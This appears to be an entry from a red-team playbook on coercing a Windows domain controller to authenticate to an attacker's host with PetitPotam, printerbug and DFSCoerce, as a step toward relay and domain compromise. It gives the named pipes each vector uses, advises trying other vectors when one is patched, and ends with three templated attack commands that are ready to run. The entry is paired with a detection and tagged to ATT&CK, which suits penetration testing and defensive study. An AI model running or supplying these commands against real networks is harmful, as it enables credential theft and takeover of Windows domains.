---
id: coerce-petitpotam
title: Coerce DC auth (PetitPotam / printerbug)
section: Coercion -> relay -> domain compromise
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1187]
platform: [windows, network]
source: hacktheplanet §"Coercion -> relay -> domain compromise"
pair: coercion-5145
---

Force a machine — ideally a DC — to authenticate to a host you control, then
relay that auth (see `ntlm-relay-ntlmrelayx`). PetitPotam abuses MS-EFSRPC,
printerbug the MS-RPRN spooler, DFSCoerce the MS-DFSNM namespace interface;
`coercer` sprays many vectors at once. Each protocol lands on a different named
pipe (`efsrpc`/`lsarpc`/`samr`/`lsass`/`netlogon`, `spoolss`, `netdfs`
respectively), which is what the paired detection keys on — so if one vector is
patched or filtered, try the others before assuming the target is hardened.
DFSCoerce only works against domain controllers. Here `{{rhost}}` is the DC being
coerced and `{{lhost}}` is your listener.

```sh
impacket-petitpotam {{lhost}} {{rhost}}
printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
dfscoerce -u {{user}} -p {{password}} -d {{domain}} {{lhost}} {{rhost}}
```
